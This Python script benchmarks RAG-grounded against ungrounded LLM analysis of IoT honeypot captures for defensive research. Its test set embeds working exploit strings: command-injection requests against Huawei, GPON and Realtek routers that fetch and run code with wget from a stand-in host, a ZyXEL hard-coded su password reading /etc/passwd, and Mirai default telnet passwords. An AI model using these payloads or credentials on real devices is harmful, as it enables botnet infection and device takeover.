"""
Experiment: does RAG improve analysis accuracy over an ungrounded LLM?

What this measures (and why):
  A capable LLM already knows the broad MITRE ATT&CK taxonomy, so retrieval adds
  little there. RAG's real value is grounding answers in SPECIFIC knowledge a
  model recalls unreliably from memory - exact CVE identifiers and named threats.
  So this experiment scores SPECIFIC-REFERENCE IDENTIFICATION: for each attack,
  does the analysis name the correct CVE / malware family?

Method (reproducible):
  - A labelled set of realistic IoT attacks, each with the specific identifier a
    correct analysis should surface (a CVE number, or "Mirai").
  - Each attack is analysed twice with the SAME model and SAME output schema:
      RAG        - the real pipeline: retrieve notes from the Chroma knowledge
                   base and put them in the prompt (backend/app/agent.py logic).
      Ungrounded - identical request but with NO retrieved context.
  - Score: correct if the analysis text (classification + technique + report +
    mitigations) contains one of the accepted identifiers for that attack.
  - Outputs: rag_vs_ungrounded_accuracy.png and rag_vs_ungrounded_results.csv.

Single run of n samples on one model. Run:  python3 compare_rag_vs_ungrounded.py
"""

import csv
import pathlib
import sys

ROOT = pathlib.Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "backend"))

from dotenv import load_dotenv

load_dotenv(ROOT / "backend" / ".env")  # ANTHROPIC_API_KEY

from app.agent import ANALYSIS_MODEL, SYSTEM_PROMPT, AttackAnalysis, _get_client
from app.knowledge import build_knowledge_base, retrieve_context

# Ungrounded counterpart of the backend SYSTEM_PROMPT: same wording, but tells the
# model to use its own knowledge instead of supplied reference material.
UNGROUNDED_SYSTEM = (
    "You are a cybersecurity analyst reviewing data captured by a low-interaction "
    "IoT honeypot (a decoy service that only records what connects to it). Using your "
    "own knowledge, classify the likely attack, judge its severity, map it to a MITRE "
    "ATT&CK technique, write a short plain-English report a student could understand, "
    "and suggest practical mitigations. This is defensive analysis of already-captured "
    "attacker data."
)

# --- Labelled test set: (description, port, raw bytes, accepted identifiers) ---
# CVE samples are known IoT exploits; Mirai samples are documented default-credential
# pairs from the Mirai source. Accepted identifiers are matched case-insensitively.
TESTS = [
    ("Huawei HG532 UPnP/TR-064 exploit", 37215,
     "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1\r\n<NewStatusURL>$(busybox wget http://x/m -O ->; sh m)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL>",
     ["CVE-2017-17215"]),
    ("ZyXEL hard-coded su password escalation", 23,
     "admin\r\n1234\r\nsu\r\nzyad5001\r\ncat /etc/passwd\r\n",
     ["CVE-2016-10401", "zyad5001"]),
    ("Dasan GPON router exploit", 8080,
     "POST /GponForm/diag_Form?images/ HTTP/1.1\r\nXWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`busybox wget http://x/g -O /tmp/g; sh /tmp/g`&ipv=0",
     ["CVE-2018-10561", "CVE-2018-10562"]),
    ("Realtek SDK miniigd UPnP injection", 52869,
     "POST /picsdesc.xml HTTP/1.1\r\nSOAPAction: urn:...#AddPortMapping\r\n<NewInternalClient>`cd /tmp; wget http://x/r; chmod +x r; ./r`</NewInternalClient>",
     ["CVE-2014-8361"]),
    ("Telnet default credentials (Mirai)", 23, "root\r\nxc3511\r\n", ["Mirai"]),
    ("Telnet default credentials (Mirai, DVR)", 23, "root\r\nvizxv\r\n", ["Mirai"]),
    ("Telnet default credentials (Mirai)", 23, "root\r\n7ujMko0admin\r\n", ["Mirai"]),
    ("Telnet default credentials (Mirai)", 23, "root\r\nklv123\r\n", ["Mirai"]),
]


def analyse(client, port, data, *, use_rag):
    """Run one analysis with or without retrieval; return (AttackAnalysis|None, retrieved_ids)."""
    retrieved = []
    if use_rag:
        # Same retrieval query the live pipeline now uses (payload-keyed).
        query = f"Honeypot capture on port {port}. Bytes/payload the client sent: {data!r}"
        docs = retrieve_context(query, k=3)
        retrieved = [d["id"] for d in docs]
        context_block = "\n".join(
            f"[{d['id']}] {d['title']} ({d['source']}): {d['text']}" for d in docs
        )
        system = SYSTEM_PROMPT
        user = (
            "Use the reference material below to ground your analysis. Where it applies, "
            "cite the relevant MITRE technique IDs or CVE numbers in your report and "
            "mitre_technique fields.\n\n"
            "=== Reference material (retrieved from the knowledge base) ===\n"
            f"{context_block}\n\n"
            "=== Captured attack ===\n"
            f"- Target port: {port}\n"
            f"- Raw bytes the client sent: {data!r}\n"
        )
    else:
        system = UNGROUNDED_SYSTEM
        user = (
            "Analyse this captured honeypot connection using your own knowledge. Cite any "
            "relevant MITRE technique IDs or CVE numbers in your report and mitre_technique "
            "fields.\n\n"
            "=== Captured attack ===\n"
            f"- Target port: {port}\n"
            f"- Raw bytes the client sent: {data!r}\n"
        )

    resp = client.messages.parse(
        model=ANALYSIS_MODEL, max_tokens=2000, system=system,
        messages=[{"role": "user", "content": user}], output_format=AttackAnalysis,
    )
    return resp.parsed_output, retrieved


def correct(analysis, accept):
    """True if the analysis text names one of the accepted CVE/threat identifiers."""
    if analysis is None:
        return False
    blob = " ".join([
        analysis.classification, analysis.mitre_technique, analysis.report,
        " ".join(analysis.recommended_mitigations),
    ]).lower()
    return any(a.lower() in blob for a in accept)


def main():
    build_knowledge_base()
    client = _get_client()

    rows = []
    rag_hits = ung_hits = 0
    print(f"Model under test: {ANALYSIS_MODEL}")
    print("Metric: correctly identifies the specific CVE / malware family\n")
    for desc, port, data, accept in TESTS:
        rag, retrieved = analyse(client, port, data, use_rag=True)
        ung, _ = analyse(client, port, data, use_rag=False)
        rag_ok, ung_ok = correct(rag, accept), correct(ung, accept)
        rag_hits += rag_ok
        ung_hits += ung_ok
        print(f"- {desc}  (want one of {accept})")
        print(f"    retrieved: {retrieved}")
        print(f"    RAG        -> {'HIT ' if rag_ok else 'MISS'}")
        print(f"    Ungrounded -> {'HIT ' if ung_ok else 'MISS'}")
        rows.append([desc, port, "|".join(accept), rag_ok, ung_ok])

    n = len(TESTS)
    rag_acc = 100.0 * rag_hits / n
    ung_acc = 100.0 * ung_hits / n
    print(f"\nRAG accuracy:        {rag_hits}/{n} = {rag_acc:.0f}%")
    print(f"Ungrounded accuracy: {ung_hits}/{n} = {ung_acc:.0f}%")

    csv_path = ROOT / "data" / "rag_vs_ungrounded_results.csv"
    with open(csv_path, "w", newline="") as f:
        w = csv.writer(f)
        w.writerow(["sample", "port", "accepted_identifiers", "rag_correct", "ungrounded_correct"])
        w.writerows(rows)
    print(f"\nWrote {csv_path}")

    import matplotlib
    matplotlib.use("Agg")
    import matplotlib.pyplot as plt

    labels = ["RAG\n(retrieval-grounded)", "Ungrounded\n(LLM only)"]
    vals = [rag_acc, ung_acc]
    fig, ax = plt.subplots(figsize=(6, 4.5))
    bars = ax.bar(labels, vals, color=["#2b8cbe", "#bdbdbd"], width=0.55, edgecolor="black")
    ax.set_ylabel("Specific-reference accuracy (%)")
    ax.set_ylim(0, 105)
    ax.set_title("Analysis accuracy: RAG vs ungrounded LLM\n"
                 f"Specific CVE / threat identification (n={n}, model {ANALYSIS_MODEL})")
    for b, v in zip(bars, vals):
        ax.text(b.get_x() + b.get_width() / 2, v + 2, f"{v:.0f}%",
                ha="center", va="bottom", fontweight="bold")
    ax.spines[["top", "right"]].set_visible(False)
    ax.grid(axis="y", linestyle=":", alpha=0.5)
    ax.set_axisbelow(True)
    fig.tight_layout()
    png_path = ROOT / "rag_vs_ungrounded_accuracy.png"
    fig.savefig(png_path, dpi=150)
    print(f"Wrote {png_path}")


if __name__ == "__main__":
    main()
